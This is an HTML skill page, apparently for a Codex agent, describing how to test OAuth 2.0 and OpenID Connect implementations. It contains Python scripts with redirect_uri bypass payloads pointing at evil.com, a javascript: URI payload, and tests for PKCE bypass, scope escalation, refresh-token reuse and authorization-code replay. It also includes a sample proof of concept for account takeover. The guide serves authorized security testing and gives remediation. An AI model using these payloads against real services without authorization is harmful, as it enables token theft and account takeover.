@@ -1,0 +1,470 @@
+<!doctype html>
+<html lang="en">
+<head>
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <title>testing-oauth2-implementation-flaws - Skill Reader</title>
+  <style>
+    :root {
+      color-scheme: dark;
+      --bg: #151515;
+      --panel: #1c1c1c;
+      --panel-2: #222;
+      --text: #f2f2f2;
+      --muted: #c6c6c6;
+      --subtle: #969696;
+      --line: #303030;
+      --accent: #5cc8ff;
+      --code: #2a2a2a;
+    }
+    :root[data-theme="light"] {
+      color-scheme: light;
+      --bg: #f7f8fb;
+      --panel: #ffffff;
+      --panel-2: #f0f3f8;
+      --text: #171b22;
+      --muted: #394556;
+      --subtle: #637085;
+      --line: #dce3ee;
+      --accent: #1767d6;
+      --code: #eef2f7;
+    }
+    * { box-sizing: border-box; }
+    body { margin: 0; background: var(--bg); color: var(--text); font: 16px/1.7 -apple-system, BlinkMacSystemFont, "Segoe UI", Inter, sans-serif; }
+    .shell { width: min(980px, calc(100% - 32px)); margin: 0 auto; padding: 32px 0 72px; }
+    .topbar { position: sticky; top: 0; z-index: 5; display: flex; align-items: center; justify-content: space-between; gap: 12px; border-bottom: 1px solid var(--line); background: color-mix(in srgb, var(--bg) 86%, transparent); padding: 14px 0; backdrop-filter: blur(16px); }
+    .crumbs, .actions { display: flex; flex-wrap: wrap; align-items: center; gap: 8px; }
+    a, button { color: var(--text); }
+    .pill, .theme { display: inline-flex; min-height: 34px; align-items: center; border: 1px solid var(--line); border-radius: 999px; background: var(--panel-2); font-size: 13px; font-weight: 700; padding: 6px 10px; text-decoration: none; }
+    .theme { cursor: pointer; }
+    .hero { border-bottom: 1px solid var(--line); padding: 34px 0 26px; }
+    .source { color: var(--accent); font: 800 12px/1 ui-monospace, SFMono-Regular, Menlo, monospace; letter-spacing: .14em; text-transform: uppercase; }
+    h1 { margin: 12px 0 10px; font-size: clamp(2.2rem, 5vw, 4.8rem); line-height: .95; letter-spacing: 0; }
+    .description { max-width: 820px; margin: 0; color: var(--muted); font-size: 18px; }
+    .meta { display: grid; grid-template-columns: repeat(auto-fit, minmax(220px, 1fr)); gap: 10px; margin: 22px 0 0; }
+    .meta-card { border: 1px solid var(--line); border-radius: 10px; background: var(--panel); padding: 12px; }
+    .meta-card strong { display: block; color: var(--subtle); font-size: 12px; text-transform: uppercase; }
+    .meta-card span { display: block; margin-top: 4px; overflow-wrap: anywhere; font-family: ui-monospace, SFMono-Regular, Menlo, monospace; font-size: 13px; }
+    .usage { border-bottom: 1px solid var(--line); padding: 24px 0; }
+    .usage h2 { margin: 0 0 6px; font-size: 1.45rem; }
+    .usage-grid { display: grid; grid-template-columns: repeat(auto-fit, minmax(240px, 1fr)); gap: 10px; margin-top: 16px; }
+    .usage-card { border: 1px solid var(--line); border-radius: 10px; background: var(--panel); padding: 12px; }
+    .usage-card strong { display: block; margin-bottom: 6px; }
+    .usage-card p { margin: 0; color: var(--muted); }
+    article { max-width: 860px; padding-top: 22px; }
+    h2, h3, h4, h5 { line-height: 1.2; margin: 1.65em 0 .55em; }
+    h2 { font-size: 1.65rem; }
+    h3 { font-size: 1.25rem; color: var(--text); }
+    p { margin: .75em 0; color: var(--muted); }
+    ul, ol { margin: .55em 0 1.1em; padding-left: 1.35em; color: var(--muted); }
+    li { margin: .32em 0; }
+    strong { color: var(--text); }
+    code { border: 1px solid var(--line); border-radius: 5px; background: var(--code); color: var(--text); font: .92em ui-monospace, SFMono-Regular, Menlo, monospace; padding: .12em .35em; }
+    pre { overflow: auto; border: 1px solid var(--line); border-radius: 10px; background: var(--code); padding: 16px; }
+    pre code { border: 0; background: transparent; padding: 0; }
+    blockquote { border-left: 3px solid var(--accent); margin: 1em 0; background: var(--panel); color: var(--muted); padding: 10px 14px; }
+    hr { border: 0; border-top: 1px solid var(--line); margin: 28px 0; }
+    @media (max-width: 720px) { .topbar { align-items: flex-start; flex-direction: column; } .shell { width: min(100% - 24px, 980px); } }
+  </style>
+</head>
+<body>
+  <div class="shell">
+    <div class="topbar">
+      <div class="crumbs">
+        <a class="pill" href="../index.html">Skills Directory</a>
+        <span class="pill">Codex</span>
+      </div>
+      <div class="actions">
+        <button class="theme" id="themeButton" type="button">Toggle theme</button>
+        <a class="pill" href="../skill-md/testing-oauth2-implementation-flaws-codex.md">Markdown</a>
+        <button class="theme" id="copyButton" type="button">Copy skill</button>
+        <button class="theme" id="downloadButton" type="button">Download</button>
+      </div>
+    </div>
+    <header class="hero">
+      <div class="source">Codex / Software engineering and app building</div>
+      <h1>testing-oauth2-implementation-flaws</h1>
+      <p class="description">'Tests OAuth 2.0 and OpenID Connect implementations for security flaws</p>
+      <section class="meta">
+        <div class="meta-card"><strong>platform</strong><span>Codex</span></div>
+<div class="meta-card"><strong>category</strong><span>Software engineering and app building</span></div>
+<div class="meta-card"><strong>display name</strong><span>testing-oauth2-implementation-flaws</span></div>
+<div class="meta-card"><strong>canonical name</strong><span>testing-oauth2-implementation-flaws</span></div>
+      </section>
+    </header>
+    <section class="usage">
+      <h2>When To Use This Skill</h2>
+      <p>'Tests OAuth 2.0 and OpenID Connect implementations for security flaws</p>
+      <div class="usage-grid">
+        <div class="usage-card"><strong>How to call it in Codex</strong><p>In Codex, click the chat box, press /, choose testing-oauth2-implementation-flaws, then write the task. Fallback prompt: Use the testing-oauth2-implementation-flaws skill to...</p></div>
+        <div class="usage-card"><strong>Friend-safe copy</strong><p>This public page removes local filesystem paths, Finder-only links, and machine-specific source locations.</p></div>
+      </div>
+    </section>
+    <article>
+      <h2>Testing OAuth2 Implementation Flaws</h2>
+<h3>When to Use</h3>
+<ul>
+<li>Assessing OAuth 2.0 authorization code flow for redirect URI validation weaknesses</li>
+<li>Testing OAuth client applications for CSRF protection (state parameter usage) and PKCE enforcement</li>
+<li>Evaluating token storage, transmission, and lifecycle management in OAuth implementations</li>
+<li>Testing scope escalation where clients request more permissions than authorized</li>
+<li>Assessing OpenID Connect implementations for ID token validation and nonce usage</li>
+</ul>
+<p><strong>Do not use</strong> without written authorization. OAuth testing may result in token theft or unauthorized access.</p>
+<h3>Prerequisites</h3>
+<ul>
+<li>Written authorization specifying the OAuth provider and client applications in scope</li>
+<li>Test OAuth client registered with the authorization server</li>
+<li>Burp Suite Professional for intercepting OAuth redirects and token flows</li>
+<li>Python 3.10+ with <code>requests</code> and <code>oauthlib</code> libraries</li>
+<li>Browser developer tools for observing OAuth redirect chains</li>
+<li>Knowledge of the OAuth 2.0 grant types in use (authorization code, implicit, client credentials)</li>
+</ul>
+<h3>Workflow</h3>
+<h4>Step 1: OAuth Flow Reconnaissance</h4>
+<pre><code>import requests
+import urllib.parse
+import re
+import hashlib
+import base64
+import secrets
+
+AUTH_SERVER = &quot;https://auth.example.com&quot;
+CLIENT_ID = &quot;test-client-id&quot;
+REDIRECT_URI = &quot;https://app.example.com/callback&quot;
+SCOPE = &quot;openid profile email&quot;
+
+# Discover OAuth endpoints
+well_known = requests.get(f&quot;{AUTH_SERVER}/.well-known/openid-configuration&quot;)
+if well_known.status_code == 200:
+    config = well_known.json()
+    print(&quot;OAuth/OIDC Configuration:&quot;)
+    print(f&quot;  Authorization: {config.get('authorization_endpoint')}&quot;)
+    print(f&quot;  Token: {config.get('token_endpoint')}&quot;)
+    print(f&quot;  UserInfo: {config.get('userinfo_endpoint')}&quot;)
+    print(f&quot;  JWKS: {config.get('jwks_uri')}&quot;)
+    print(f&quot;  Supported grants: {config.get('grant_types_supported')}&quot;)
+    print(f&quot;  Supported scopes: {config.get('scopes_supported')}&quot;)
+    print(f&quot;  PKCE methods: {config.get('code_challenge_methods_supported')}&quot;)
+    auth_endpoint = config['authorization_endpoint']
+    token_endpoint = config['token_endpoint']
+else:
+    # Try common paths
+    for path in [&quot;/authorize&quot;, &quot;/oauth/authorize&quot;, &quot;/oauth2/authorize&quot;, &quot;/auth&quot;]:
+        resp = requests.get(f&quot;{AUTH_SERVER}{path}&quot;, allow_redirects=False)
+        if resp.status_code in (302, 400):
+            print(f&quot;Authorization endpoint found: {AUTH_SERVER}{path}&quot;)
+            auth_endpoint = f&quot;{AUTH_SERVER}{path}&quot;
+            break</code></pre>
+<h4>Step 2: Redirect URI Validation Testing</h4>
+<pre><code># Test redirect_uri validation strictness
+REDIRECT_BYPASS_PAYLOADS = [
+    # Open redirect variations
+    REDIRECT_URI,                                          # Legitimate
+    &quot;https://evil.com&quot;,                                    # Different domain
+    &quot;https://app.example.com.evil.com/callback&quot;,          # Subdomain of attacker
+    &quot;https://app.example.com@evil.com/callback&quot;,          # URL authority confusion
+    f&quot;{REDIRECT_URI}/../../../evil.com&quot;,                  # Path traversal
+    f&quot;{REDIRECT_URI}?next=https://evil.com&quot;,              # Parameter injection
+    f&quot;{REDIRECT_URI}#https://evil.com&quot;,                   # Fragment injection
+    f&quot;{REDIRECT_URI}%23evil.com&quot;,                         # Encoded fragment
+    &quot;https://app.example.com/callback/../../evil&quot;,        # Relative path
+    &quot;https://APP.EXAMPLE.COM/callback&quot;,                   # Case variation
+    &quot;https://app.example.com/Callback&quot;,                   # Path case variation
+    &quot;https://app.example.com/callback/&quot;,                  # Trailing slash
+    &quot;https://app.example.com/callback?&quot;,                  # Trailing question mark
+    &quot;http://app.example.com/callback&quot;,                    # HTTP downgrade
+    &quot;https://app.example.com:443/callback&quot;,               # Explicit port
+    &quot;https://app.example.com:8443/callback&quot;,              # Different port
+    f&quot;{REDIRECT_URI}/.evil.com&quot;,                          # Dot segment
+    &quot;https://app.example.com/callbackevil&quot;,               # Path prefix match
+    &quot;javascript://app.example.com/callback%0aalert(1)&quot;,   # JavaScript protocol
+]
+
+print(&quot;=== Redirect URI Validation Testing ===\n&quot;)
+for redirect in REDIRECT_BYPASS_PAYLOADS:
+    params = {
+        &quot;response_type&quot;: &quot;code&quot;,
+        &quot;client_id&quot;: CLIENT_ID,
+        &quot;redirect_uri&quot;: redirect,
+        &quot;scope&quot;: SCOPE,
+        &quot;state&quot;: secrets.token_urlsafe(32),
+    }
+    resp = requests.get(auth_endpoint, params=params, allow_redirects=False)
+
+    if resp.status_code == 302:
+        location = resp.headers.get(&quot;Location&quot;, &quot;&quot;)
+        if &quot;code=&quot; in location or redirect in location:
+            status = &quot;ACCEPTED&quot;
+            if redirect != REDIRECT_URI:
+                print(f&quot;  [VULNERABLE] {redirect[:70]} -&gt; Redirect accepted&quot;)
+        else:
+            status = &quot;REDIRECTED&quot;
+    elif resp.status_code == 400:
+        status = &quot;REJECTED&quot;
+    else:
+        status = f&quot;HTTP {resp.status_code}&quot;
+
+    if redirect == REDIRECT_URI:
+        print(f&quot;  [BASELINE] {redirect[:70]} -&gt; {status}&quot;)</code></pre>
+<h4>Step 3: State Parameter (CSRF) Testing</h4>
+<pre><code># Test 1: Missing state parameter
+params_no_state = {
+    &quot;response_type&quot;: &quot;code&quot;,
+    &quot;client_id&quot;: CLIENT_ID,
+    &quot;redirect_uri&quot;: REDIRECT_URI,
+    &quot;scope&quot;: SCOPE,
+}
+resp = requests.get(auth_endpoint, params=params_no_state, allow_redirects=False)
+if resp.status_code == 302 and &quot;code=&quot; in resp.headers.get(&quot;Location&quot;, &quot;&quot;):
+    print(&quot;[CSRF] Authorization code issued without state parameter&quot;)
+
+# Test 2: State parameter reuse
+state_value = &quot;fixed_state_value_123&quot;
+# Use same state for multiple authorization requests
+for i in range(3):
+    params = {**params_no_state, &quot;state&quot;: state_value}
+    resp = requests.get(auth_endpoint, params=params, allow_redirects=False)
+    if resp.status_code == 302:
+        location = resp.headers.get(&quot;Location&quot;, &quot;&quot;)
+        returned_state = urllib.parse.parse_qs(
+            urllib.parse.urlparse(location).query).get(&quot;state&quot;, [None])[0]
+        if returned_state == state_value:
+            print(f&quot;[INFO] Same state accepted on attempt {i+1} (check client-side validation)&quot;)
+
+# Test 3: Token exchange without state validation (client-side check)
+# Intercept the callback and try exchanging the code without state
+print(&quot;\nNote: State validation is a client-side check. Verify the callback handler validates state.&quot;)</code></pre>
+<h4>Step 4: PKCE Bypass Testing</h4>
+<pre><code># Test if PKCE (Proof Key for Code Exchange) is enforced
+
+# Generate PKCE values
+code_verifier = secrets.token_urlsafe(64)[:128]
+code_challenge = base64.urlsafe_b64encode(
+    hashlib.sha256(code_verifier.encode()).digest()
+).decode().rstrip('=')
+
+# Test 1: Authorization request without PKCE
+params_no_pkce = {
+    &quot;response_type&quot;: &quot;code&quot;,
+    &quot;client_id&quot;: CLIENT_ID,
+    &quot;redirect_uri&quot;: REDIRECT_URI,
+    &quot;scope&quot;: SCOPE,
+    &quot;state&quot;: secrets.token_urlsafe(32),
+}
+resp = requests.get(auth_endpoint, params=params_no_pkce, allow_redirects=False)
+if resp.status_code == 302 and &quot;code=&quot; in resp.headers.get(&quot;Location&quot;, &quot;&quot;):
+    print(&quot;[PKCE] Authorization code issued without PKCE challenge&quot;)
+
+# Test 2: Token exchange without code_verifier
+auth_code = &quot;captured_auth_code&quot;  # From intercept
+token_resp = requests.post(token_endpoint, data={
+    &quot;grant_type&quot;: &quot;authorization_code&quot;,
+    &quot;code&quot;: auth_code,
+    &quot;redirect_uri&quot;: REDIRECT_URI,
+    &quot;client_id&quot;: CLIENT_ID,
+    # No code_verifier
+})
+if token_resp.status_code == 200:
+    print(&quot;[PKCE] Token issued without code_verifier - PKCE not enforced&quot;)
+
+# Test 3: Token exchange with wrong code_verifier
+token_resp = requests.post(token_endpoint, data={
+    &quot;grant_type&quot;: &quot;authorization_code&quot;,
+    &quot;code&quot;: auth_code,
+    &quot;redirect_uri&quot;: REDIRECT_URI,
+    &quot;client_id&quot;: CLIENT_ID,
+    &quot;code_verifier&quot;: &quot;wrong_verifier_value_that_does_not_match&quot;,
+})
+if token_resp.status_code == 200:
+    print(&quot;[PKCE] Token issued with wrong code_verifier - PKCE validation broken&quot;)
+
+# Test 4: Downgrade from S256 to plain
+params_plain_pkce = {
+    **params_no_pkce,
+    &quot;code_challenge&quot;: code_verifier,  # Plain = verifier itself
+    &quot;code_challenge_method&quot;: &quot;plain&quot;,
+}
+resp = requests.get(auth_endpoint, params=params_plain_pkce, allow_redirects=False)
+if resp.status_code == 302:
+    print(&quot;[PKCE] Plain challenge method accepted - vulnerable to interception&quot;)</code></pre>
+<h4>Step 5: Scope Escalation and Token Testing</h4>
+<pre><code># Test 1: Request additional scopes beyond what's registered
+elevated_scopes = [
+    &quot;openid profile email admin&quot;,
+    &quot;openid profile email write:users&quot;,
+    &quot;openid profile email delete:*&quot;,
+    &quot;openid profile email admin:full&quot;,
+    &quot;*&quot;,
+]
+
+for scope in elevated_scopes:
+    params = {
+        &quot;response_type&quot;: &quot;code&quot;,
+        &quot;client_id&quot;: CLIENT_ID,
+        &quot;redirect_uri&quot;: REDIRECT_URI,
+        &quot;scope&quot;: scope,
+        &quot;state&quot;: secrets.token_urlsafe(32),
+    }
+    resp = requests.get(auth_endpoint, params=params, allow_redirects=False)
+    if resp.status_code == 302:
+        location = resp.headers.get(&quot;Location&quot;, &quot;&quot;)
+        if &quot;code=&quot; in location:
+            print(f&quot;[SCOPE] Elevated scope accepted: {scope}&quot;)
+
+# Test 2: Token reuse across clients
+# Use a token from client A on client B's API
+token_a = &quot;access_token_from_client_a&quot;
+resp = requests.get(&quot;https://other-service.example.com/api/resource&quot;,
+    headers={&quot;Authorization&quot;: f&quot;Bearer {token_a}&quot;})
+if resp.status_code == 200:
+    print(&quot;[TOKEN] Token from client A accepted by different service (audience not validated)&quot;)
+
+# Test 3: Refresh token theft and reuse
+refresh_token = &quot;captured_refresh_token&quot;
+# Try using refresh token with different client_id
+token_resp = requests.post(token_endpoint, data={
+    &quot;grant_type&quot;: &quot;refresh_token&quot;,
+    &quot;refresh_token&quot;: refresh_token,
+    &quot;client_id&quot;: &quot;different-client-id&quot;,
+})
+if token_resp.status_code == 200:
+    print(&quot;[TOKEN] Refresh token accepted for different client - not bound to client&quot;)</code></pre>
+<h4>Step 6: Implicit Flow and Token Leakage Testing</h4>
+<pre><code># Test if implicit flow is enabled (should be disabled per OAuth 2.1)
+implicit_params = {
+    &quot;response_type&quot;: &quot;token&quot;,
+    &quot;client_id&quot;: CLIENT_ID,
+    &quot;redirect_uri&quot;: REDIRECT_URI,
+    &quot;scope&quot;: SCOPE,
+    &quot;state&quot;: secrets.token_urlsafe(32),
+}
+resp = requests.get(auth_endpoint, params=implicit_params, allow_redirects=False)
+if resp.status_code == 302:
+    location = resp.headers.get(&quot;Location&quot;, &quot;&quot;)
+    if &quot;access_token=&quot; in location:
+        print(&quot;[IMPLICIT] Implicit flow enabled - token in URL fragment (deprecated/insecure)&quot;)
+
+# Test token leakage via Referer header
+# Check if tokens appear in URLs that could leak via Referer
+print(&quot;\nToken Leakage Checks:&quot;)
+print(&quot;  - Check if access tokens appear in URL query parameters&quot;)
+print(&quot;  - Check if tokens are logged in server access logs&quot;)
+print(&quot;  - Check if callback URL with code is cached by the browser&quot;)
+print(&quot;  - Check if the authorization code is single-use (replay test)&quot;)
+
+# Authorization code replay test
+auth_code_to_replay = &quot;captured_auth_code&quot;
+for attempt in range(3):
+    token_resp = requests.post(token_endpoint, data={
+        &quot;grant_type&quot;: &quot;authorization_code&quot;,
+        &quot;code&quot;: auth_code_to_replay,
+        &quot;redirect_uri&quot;: REDIRECT_URI,
+        &quot;client_id&quot;: CLIENT_ID,
+        &quot;client_secret&quot;: &quot;client_secret_value&quot;,
+    })
+    print(f&quot;  Code replay attempt {attempt+1}: {token_resp.status_code}&quot;)
+    if attempt &gt; 0 and token_resp.status_code == 200:
+        print(&quot;  [VULNERABLE] Authorization code is not single-use&quot;)</code></pre>
+<h3>Key Concepts</h3>
+<p>| Term | Definition | |------|------------| | <strong>Authorization Code Flow</strong> | OAuth 2.0 flow where the client receives an authorization code via redirect, then exchanges it for tokens at the token endpoint | | <strong>PKCE</strong> | Proof Key for Code Exchange - extension that binds the authorization request to the token request using a code verifier/challenge, preventing authorization code interception | | <strong>Redirect URI Validation</strong> | Authorization server verification that the redirect_uri matches the registered value exactly, preventing code/token theft via open redirect | | <strong>State Parameter</strong> | Random value passed in the authorization request and verified in the callback to prevent CSRF attacks on the OAuth flow | | <strong>Scope Escalation</strong> | Requesting or obtaining more permissions (scopes) than the client is authorized for, enabling unauthorized access | | <strong>Implicit Flow</strong> | Deprecated OAuth flow that returns tokens directly in the URL fragment, vulnerable to token leakage and replay attacks |</p>
+<h3>Tools &amp; Systems</h3>
+<ul>
+<li><strong>Burp Suite Professional</strong>: Intercept and manipulate OAuth redirects, authorization codes, and token exchanges</li>
+<li><strong>EsPReSSO (Burp Extension)</strong>: Automated testing of OAuth and OpenID Connect implementations for known vulnerabilities</li>
+<li><strong>oauth2-security-tester</strong>: Dedicated tool for testing OAuth 2.0 flows against common attack patterns</li>
+<li><strong>OWASP ZAP</strong>: Passive scanner that detects OAuth misconfigurations in intercepted traffic</li>
+<li><strong>jwt.io</strong>: Online JWT decoder for analyzing OAuth access tokens and ID tokens</li>
+</ul>
+<h3>Common Scenarios</h3>
+<h4>Scenario: Social Login OAuth Implementation Assessment</h4>
+<p><strong>Context</strong>: A web application implements &quot;Login with Google&quot; and &quot;Login with GitHub&quot; using OAuth 2.0 Authorization Code flow. The application is a SaaS platform where account takeover has high business impact.</p>
+<p><strong>Approach</strong>:</p>
+<ol>
+<li>Analyze the OAuth configuration at <code>/.well-known/openid-configuration</code> for both providers</li>
+<li>Test redirect URI validation: discover that the application registers <code>https://app.example.com/callback</code> but the server accepts <code>https://app.example.com/callback/..%2fevil</code></li>
+<li>Test state parameter: authorization request includes state but the callback handler does not validate it (CSRF possible)</li>
+<li>Test PKCE: not implemented for the authorization code flow, making code interception possible on mobile</li>
+<li>Test implicit flow: still enabled despite not being used by the application</li>
+<li>Test scope: application requests <code>openid profile email</code> but the authorization server also grants <code>read:repos</code> without explicit consent</li>
+<li>Test authorization code replay: code can be exchanged twice, indicating lack of single-use enforcement</li>
+<li>Test token audience: access token from Google login accepted by GitHub API endpoint (audience not validated)</li>
+</ol>
+<p><strong>Pitfalls</strong>:</p>
+<ul>
+<li>Only testing the OAuth flow in the browser without intercepting and manipulating redirect parameters</li>
+<li>Not testing both the authorization request and the token exchange independently</li>
+<li>Missing open redirect vulnerabilities in the application that can be chained with OAuth redirect_uri</li>
+<li>Not testing the state parameter validation on the client side (server may include it but client may not check it)</li>
+<li>Assuming PKCE is enforced because the authorization server supports it (client must also send it)</li>
+</ul>
+<h3>Output Format</h3>
+<pre><code>## Finding: OAuth2 Redirect URI Bypass Enables Authorization Code Theft
+
+**ID**: API-OAUTH-001
+**Severity**: Critical (CVSS 9.3)
+**Affected Component**: OAuth 2.0 Authorization Code Flow
+**Authorization Server**: auth.example.com
+
+**Description**:
+The authorization server's redirect_uri validation uses prefix matching
+instead of exact string matching. An attacker can manipulate the redirect_uri
+to redirect the authorization code to an attacker-controlled endpoint,
+enabling account takeover. Additionally, PKCE is not enforced and the
+state parameter is not validated by the client application.
+
+**Proof of Concept**:
+1. Craft authorization URL with manipulated redirect_uri:
+   https://auth.example.com/authorize?response_type=code&amp;client_id=app
+   &amp;redirect_uri=https://app.example.com/callback/../../../evil.com
+   &amp;scope=openid+profile+email&amp;state=abc123
+2. User authenticates and approves consent
+3. Authorization code redirected to https://evil.com?code=AUTH_CODE&amp;state=abc123
+4. Attacker exchanges code at token endpoint (no PKCE required)
+5. Attacker receives access token and ID token for victim's account
+
+**Impact**:
+Complete account takeover for any user who clicks a crafted OAuth login link.
+The attacker gains full access to the user's profile, email, and any
+resources the OAuth scope grants access to.
+
+**Remediation**:
+1. Implement exact string matching for redirect_uri validation (no wildcards, no prefix matching)
+2. Enforce PKCE (S256 method) for all authorization code flow requests
+3. Validate the state parameter in the callback handler before exchanging the code
+4. Disable the implicit flow on the authorization server
+5. Enforce single-use authorization codes with a short TTL (max 60 seconds)
+6. Validate the audience (aud) claim in tokens before accepting them</code></pre>
+    </article>
+  </div>
+  <script type="application/json" id="skillPackage">"---\nname: testing-oauth2-implementation-flaws\ndisplay_name: testing-oauth2-implementation-flaws\nplatform: Codex\ncategory: Software engineering and app building\n---\n\n# testing-oauth2-implementation-flaws - Codex Skill Package\n\n## What This Is\n\nThis is a friend-safe Markdown copy of `testing-oauth2-implementation-flaws` for Codex. It removes local filesystem paths, Finder-only links, and machine-specific source locations.\n\n## When To Use This Skill\n\nUse this skill when your task matches this description:\n\n- Assessing OAuth 2.0 authorization code flow for redirect URI validation weaknesses\n\n## How To Use It In Codex\n\nIn Codex, click the chat box, press /, choose testing-oauth2-implementation-flaws, then write the task. Fallback prompt: Use the testing-oauth2-implementation-flaws skill to...\n\n## Skill Metadata\n\n| Field | Value |\n| --- | --- |\n| Display name | `testing-oauth2-implementation-flaws` |\n| Canonical name | `testing-oauth2-implementation-flaws` |\n| Platform | `Codex` |\n| Category | Software engineering and app building |\n\n## Description\n\n- Assessing OAuth 2.0 authorization code flow for redirect URI validation weaknesses\n\n## Original SKILL.md\n\n---\nname: testing-oauth2-implementation-flaws\ndescription: 'Tests OAuth 2.0 and OpenID Connect implementations for security flaws\n  including authorization code interception, redirect URI manipulation, CSRF in OAuth\n  flows, token leakage, scope escalation, and PKCE bypass. The tester evaluates the\n  authorization server, client application, and token handling for common misconfigurations\n  that enable account takeover or unauthorized access. Activates for requests involving\n  OAuth security testing, OIDC vulnerability assessment, OAuth2 redirect bypass, or\n  authorization code flow testing.\n\n  '\ndomain: cybersecurity\nsubdomain: api-security\ntags:\n- api-security\n- oauth2\n- oidc\n- authentication\n- redirect-uri\n- token-security\nversion: 1.0.0\nauthor: mahipal\nlicense: Apache-2.0\nnist_csf:\n- PR.PS-01\n- ID.RA-01\n- PR.DS-10\n- DE.CM-01\nmitre_attack:\n- T1190\n- T1059.007\n- T1552.001\n- T1027\n- T1070\n---\n# Testing OAuth2 Implementation Flaws\n\n## When to Use\n\n- Assessing OAuth 2.0 authorization code flow for redirect URI validation weaknesses\n- Testing OAuth client applications for CSRF protection (state parameter usage) and PKCE enforcement\n- Evaluating token storage, transmission, and lifecycle management in OAuth implementations\n- Testing scope escalation where clients request more permissions than authorized\n- Assessing OpenID Connect implementations for ID token validation and nonce usage\n\n**Do not use** without written authorization. OAuth testing may result in token theft or unauthorized access.\n\n## Prerequisites\n\n- Written authorization specifying the OAuth provider and client applications in scope\n- Test OAuth client registered with the authorization server\n- Burp Suite Professional for intercepting OAuth redirects and token flows\n- Python 3.10+ with `requests` and `oauthlib` libraries\n- Browser developer tools for observing OAuth redirect chains\n- Knowledge of the OAuth 2.0 grant types in use (authorization code, implicit, client credentials)\n\n## Workflow\n\n### Step 1: OAuth Flow Reconnaissance\n\n```python\nimport requests\nimport urllib.parse\nimport re\nimport hashlib\nimport base64\nimport secrets\n\nAUTH_SERVER = \"https://auth.example.com\"\nCLIENT_ID = \"test-client-id\"\nREDIRECT_URI = \"https://app.example.com/callback\"\nSCOPE = \"openid profile email\"\n\n# Discover OAuth endpoints\nwell_known = requests.get(f\"{AUTH_SERVER}/.well-known/openid-configuration\")\nif well_known.status_code == 200:\n    config = well_known.json()\n    print(\"OAuth/OIDC Configuration:\")\n    print(f\"  Authorization: {config.get('authorization_endpoint')}\")\n    print(f\"  Token: {config.get('token_endpoint')}\")\n    print(f\"  UserInfo: {config.get('userinfo_endpoint')}\")\n    print(f\"  JWKS: {config.get('jwks_uri')}\")\n    print(f\"  Supported grants: {config.get('grant_types_supported')}\")\n    print(f\"  Supported scopes: {config.get('scopes_supported')}\")\n    print(f\"  PKCE methods: {config.get('code_challenge_methods_supported')}\")\n    auth_endpoint = config['authorization_endpoint']\n    token_endpoint = config['token_endpoint']\nelse:\n    # Try common paths\n    for path in [\"/authorize\", \"/oauth/authorize\", \"/oauth2/authorize\", \"/auth\"]:\n        resp = requests.get(f\"{AUTH_SERVER}{path}\", allow_redirects=False)\n        if resp.status_code in (302, 400):\n            print(f\"Authorization endpoint found: {AUTH_SERVER}{path}\")\n            auth_endpoint = f\"{AUTH_SERVER}{path}\"\n            break\n```\n\n### Step 2: Redirect URI Validation Testing\n\n```python\n# Test redirect_uri validation strictness\nREDIRECT_BYPASS_PAYLOADS = [\n    # Open redirect variations\n    REDIRECT_URI,                                          # Legitimate\n    \"https://evil.com\",                                    # Different domain\n    \"https://app.example.com.evil.com/callback\",          # Subdomain of attacker\n    \"https://app.example.com@evil.com/callback\",          # URL authority confusion\n    f\"{REDIRECT_URI}/../../../evil.com\",                  # Path traversal\n    f\"{REDIRECT_URI}?next=https://evil.com\",              # Parameter injection\n    f\"{REDIRECT_URI}#https://evil.com\",                   # Fragment injection\n    f\"{REDIRECT_URI}%23evil.com\",                         # Encoded fragment\n    \"https://app.example.com/callback/../../evil\",        # Relative path\n    \"https://APP.EXAMPLE.COM/callback\",                   # Case variation\n    \"https://app.example.com/Callback\",                   # Path case variation\n    \"https://app.example.com/callback/\",                  # Trailing slash\n    \"https://app.example.com/callback?\",                  # Trailing question mark\n    \"http://app.example.com/callback\",                    # HTTP downgrade\n    \"https://app.example.com:443/callback\",               # Explicit port\n    \"https://app.example.com:8443/callback\",              # Different port\n    f\"{REDIRECT_URI}/.evil.com\",                          # Dot segment\n    \"https://app.example.com/callbackevil\",               # Path prefix match\n    \"javascript://app.example.com/callback%0aalert(1)\",   # JavaScript protocol\n]\n\nprint(\"=== Redirect URI Validation Testing ===\\n\")\nfor redirect in REDIRECT_BYPASS_PAYLOADS:\n    params = {\n        \"response_type\": \"code\",\n        \"client_id\": CLIENT_ID,\n        \"redirect_uri\": redirect,\n        \"scope\": SCOPE,\n        \"state\": secrets.token_urlsafe(32),\n    }\n    resp = requests.get(auth_endpoint, params=params, allow_redirects=False)\n\n    if resp.status_code == 302:\n        location = resp.headers.get(\"Location\", \"\")\n        if \"code=\" in location or redirect in location:\n            status = \"ACCEPTED\"\n            if redirect != REDIRECT_URI:\n                print(f\"  [VULNERABLE] {redirect[:70]} -> Redirect accepted\")\n        else:\n            status = \"REDIRECTED\"\n    elif resp.status_code == 400:\n        status = \"REJECTED\"\n    else:\n        status = f\"HTTP {resp.status_code}\"\n\n    if redirect == REDIRECT_URI:\n        print(f\"  [BASELINE] {redirect[:70]} -> {status}\")\n```\n\n### Step 3: State Parameter (CSRF) Testing\n\n```python\n# Test 1: Missing state parameter\nparams_no_state = {\n    \"response_type\": \"code\",\n    \"client_id\": CLIENT_ID,\n    \"redirect_uri\": REDIRECT_URI,\n    \"scope\": SCOPE,\n}\nresp = requests.get(auth_endpoint, params=params_no_state, allow_redirects=False)\nif resp.status_code == 302 and \"code=\" in resp.headers.get(\"Location\", \"\"):\n    print(\"[CSRF] Authorization code issued without state parameter\")\n\n# Test 2: State parameter reuse\nstate_value = \"fixed_state_value_123\"\n# Use same state for multiple authorization requests\nfor i in range(3):\n    params = {**params_no_state, \"state\": state_value}\n    resp = requests.get(auth_endpoint, params=params, allow_redirects=False)\n    if resp.status_code == 302:\n        location = resp.headers.get(\"Location\", \"\")\n        returned_state = urllib.parse.parse_qs(\n            urllib.parse.urlparse(location).query).get(\"state\", [None])[0]\n        if returned_state == state_value:\n            print(f\"[INFO] Same state accepted on attempt {i+1} (check client-side validation)\")\n\n# Test 3: Token exchange without state validation (client-side check)\n# Intercept the callback and try exchanging the code without state\nprint(\"\\nNote: State validation is a client-side check. Verify the callback handler validates state.\")\n```\n\n### Step 4: PKCE Bypass Testing\n\n```python\n# Test if PKCE (Proof Key for Code Exchange) is enforced\n\n# Generate PKCE values\ncode_verifier = secrets.token_urlsafe(64)[:128]\ncode_challenge = base64.urlsafe_b64encode(\n    hashlib.sha256(code_verifier.encode()).digest()\n).decode().rstrip('=')\n\n# Test 1: Authorization request without PKCE\nparams_no_pkce = {\n  